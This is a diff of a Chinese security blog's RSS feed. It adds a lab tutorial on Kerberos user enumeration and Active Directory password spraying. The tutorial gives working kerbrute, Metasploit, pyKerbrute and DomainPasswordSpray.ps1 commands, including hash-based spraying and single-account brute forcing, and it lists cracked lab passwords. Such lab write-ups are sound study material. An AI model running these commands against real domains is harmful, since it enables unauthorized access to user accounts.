@@ -5,8 +5,82 @@
         <link>http://gyzero.shop</link>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Fri, 08 Mar 2024 16:46:43 +0800</pubDate>
-        <lastBuildDate>Fri, 08 Mar 2024 16:46:43 +0800</lastBuildDate>
+        <pubDate>Sat, 09 Mar 2024 15:47:33 +0800</pubDate>
+        <lastBuildDate>Sat, 09 Mar 2024 15:47:33 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">http://gyzero.shop/2024/03/09/network-security/neiwang/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</guid>
+            <title>域用户枚举密码喷洒</title>
+            <link>http://gyzero.shop/2024/03/09/network-security/neiwang/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</link>
+            <pubDate>Sat, 09 Mar 2024 15:47:33 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;什么是密码喷洒&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;密码喷洒&lt;/strong&gt;（&lt;strong&gt;密码喷洒攻击&lt;/strong&gt;）是指攻击者使用常见密码试图访问一个域上的多个帐户。攻击者可以使用常见弱密码列表（例如 “123456” 或 “password1”）在一次攻击中访问多个帐户，在我们获得一个域用户的密码时可以用这一个密码去尝试登陆其他账户&lt;/p&gt;
+&lt;p&gt;其实就是内网信息收集后，用同一个密码去爆破不同的用户名，去碰撞。&lt;/p&gt;
+&lt;h3 id=&#34;用户枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户枚举&#34;&gt;#&lt;/a&gt; 用户枚举&lt;/h3&gt;
+&lt;p&gt;做密码喷洒肯定是要先确定有哪些账号我们可以利用 Kerberos 错误代码进行判断&lt;/p&gt;
+&lt;p&gt;抓取认证阶段的数据包分析&lt;/p&gt;
+&lt;p&gt;图中 &lt;code&gt;cname&lt;/code&gt;  为认证用户名&lt;/p&gt;
+&lt;p&gt;在 AS-REQ 数据包中三种状态的错误代码分别为：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-undefined&#34;&gt;KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证(启用)
+KDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销(禁用)
+KDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看到用户存在的为 KDC_ERR_PREAUTH_REQUIRED&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310175010290.png&#34; alt=&#34;image-20240310175010290&#34;&gt;&lt;/p&gt;
+&lt;p&gt;用户不存在的为 KDC_ERR_C_PRINCIPAL_UNKNOWN&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310180102228.png&#34; alt=&#34;image-20240310180102228&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;kerbrute工具枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerbrute工具枚举&#34;&gt;#&lt;/a&gt; kerbrute 工具枚举&lt;/h4&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;kerbrute_windows_amd64.exe userenum &lt;span class=&#34;token parameter variable&#34;&gt;--dc&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.10.137 &lt;span class=&#34;token parameter variable&#34;&gt;-d&lt;/span&gt; yunyi.io user.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;userenum 用户枚举模式&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;dc&lt;/span&gt; 域控ip&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d 域名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user.txt 指定的字典&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310174119799.png&#34; alt=&#34;image-20240310174119799&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可看到图中有 test,yunyi,yunyi1,test1,test12 用户在真实环境中可以搜集各种当前环境的信息创建一个字典成功率更高&lt;/p&gt;
+&lt;h4 id=&#34;msf模块枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf模块枚举&#34;&gt;#&lt;/a&gt; msf 模块枚举&lt;/h4&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use auxiliary/gather/kerberos_enumusers&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; domain yunyi.io 域名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; rhosts &lt;span class=&#34;token number&#34;&gt;10.10&lt;/span&gt;.10.137 域控ip&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; user_file hc/user.txt 设置枚举用户字典&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310204600469.png&#34; alt=&#34;image-20240310204600469&#34;&gt;&lt;/p&gt;
+&lt;p&gt;枚举出五个用户&lt;/p&gt;
+&lt;h4 id=&#34;pykerbrute枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pykerbrute枚举&#34;&gt;#&lt;/a&gt; pyKerbrute 枚举&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;EnumADUser.py &amp;lt;域控制地址&amp;gt; &amp;lt;域名称&amp;gt; &amp;lt;文件&amp;gt; &amp;lt;模式&amp;gt;
+python2 EnumADUser.py 10.10.10.137 yunyi.io user.txt tcp
+python2 EnumADUser.py 10.10.10.137 yunyi.io user.txt udp模式也可以
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310233742455.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;密码喷洒&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#密码喷洒&#34;&gt;#&lt;/a&gt; 密码喷洒&lt;/h3&gt;
+&lt;p&gt;枚举出了用户就该尝试登陆了，针对一个用户用不同密码爆破因为管理员可能会设置锁定，为了防止账号被锁可以用单个密码去登陆多个账户&lt;/p&gt;
+&lt;h4 id=&#34;kerbrute&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerbrute&#34;&gt;#&lt;/a&gt; kerbrute&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;kerbrute_windows_amd64.exe passwordspray --dc 10.10.10.137 -d yunyi.io user.txt 123456
+kerbrute_windows_amd64.exe passwordspray --dc 10.10.10.137 -d yunyi.io user.txt YUNyi123
+--dc 域控IP
+-d 域名
+passwordspray 密码喷洒模式
+12346 YUNyi123密码
+user.txt 存在的域用户名
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310205801736.png&#34; alt=&#34;image-20240310205801736&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可见枚举出 test yunyi1 账号的密码为 123456&lt;/p&gt;
+&lt;p&gt;test yunyi test1 为 YUNyi123&lt;/p&gt;
+&lt;p&gt;有时管理员也可能会设置为不锁定账户这时也可以进行单个账户爆破密码&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;kerbrute_windows_amd64.exe bruteuser --dc 10.10.10.137 -d yunyi.io pass.txt test&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;pass.txt 为密码字典 账号 test&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310210616793.png&#34; alt=&#34;image-20240310210616793&#34;&gt;&lt;/p&gt;
+&lt;p&gt;抓包分析&lt;/p&gt;
+&lt;p&gt;第一张图 test12ASREQ 包&lt;/p&gt;
+&lt;p&gt;第二张 test12ASREP 包&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310211333982.png&#34; alt=&#34;image-20240310211333982&#34;&gt;&lt;/p&gt;
+&lt;p&gt;账号存在密码正确返回&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310211419532.png&#34; alt=&#34;image-20240310211419532&#34;&gt;&lt;/p&gt;
+&lt;p&gt;错误的返回包&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310212005332.png&#34; alt=&#34;image-20240310212005332&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;pykerbrute&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pykerbrute&#34;&gt;#&lt;/a&gt; pyKerbrute&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;https://github.com/3gstudent/pyKerbrute&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;ADPwdSpray.py &amp;lt;域控制地址&amp;gt; &amp;lt;域名称&amp;gt; &amp;lt;文件&amp;gt; &amp;lt;密码类型&amp;gt; &amp;lt;数据&amp;gt; &amp;lt;模式&amp;gt;
+python2 ADPwdSpray.py 10.10.10.137 yunyi.io user.txt clearpassword YUNyi123 tcp
+python2 ADPwdSpray.py 10.10.10.137 yunyi.io user.txt clearpassword 123456 tcp
+python2 ADPwdSpray.py 10.10.10.137 yunyi.io user.txt ntlmhash 161cff084477fe596a5db81874498a24 tcp hash也是可以的
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310232927815.png&#34; alt=&#34;image-20240310232927815&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;domainpasswordspraypsl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#domainpasswordspraypsl&#34;&gt;#&lt;/a&gt; DomainPasswordSpray…psl&lt;/h4&gt;
+&lt;p&gt;DomainPasswordSpray…psl 也可以进行密码喷洒攻击，该 PowerShell 脚本需要在域内机器上执行，默认情况下该脚本是利用 LDAP 从域中导出用户列表，去除被锁定的用户，用指定的密码进行喷洒。&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;\DomainPasswordSpray&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ps1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Invoke-DomainPasswordSpray&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Password 123456&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Invoke-DomainPasswordSpray&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Password YUNyi123&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Invoke-DomainPasswordSpray&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Userlist user&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Domain yunyi&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;password 123456 指定用户列表&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310235821942.png&#34; alt=&#34;image-20240310235821942&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310235838927.png&#34; alt=&#34;image-20240310235838927&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310235854193.png&#34; alt=&#34;image-20240310235854193&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://gyzero.shop/2024/03/08/network-security/neiwang/BloodHound%E5%B7%A5%E5%85%B7/BloodHound%E5%B7%A5%E5%85%B7/</guid>
             <title>BloodHound工具</title>
@@ -2416,9 +2490,9 @@ linux 操作系统&lt;br&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/</guid>
+            <guid isPermalink="true">http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/%E5%9F%9F%E7%8E%AF%E5%A2%83/</guid>
             <title>域环境</title>
-            <link>http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/</link>
+            <link>http://gyzero.shop/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/%E5%9F%9F%E7%8E%AF%E5%A2%83/</link>
             <pubDate>Mon, 30 Oct 2023 12:00:34 +0800</pubDate>
             <description><![CDATA[ &lt;h3 id=&#34;域&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#域&#34;&gt;#&lt;/a&gt; 域&lt;/h3&gt;
 &lt;p&gt;在计算机网络中，&lt;strong&gt;域环境&lt;/strong&gt;是一种组织资源和用户的方式，它允许集中管理和控制网络中的各种对象。&lt;/p&gt;
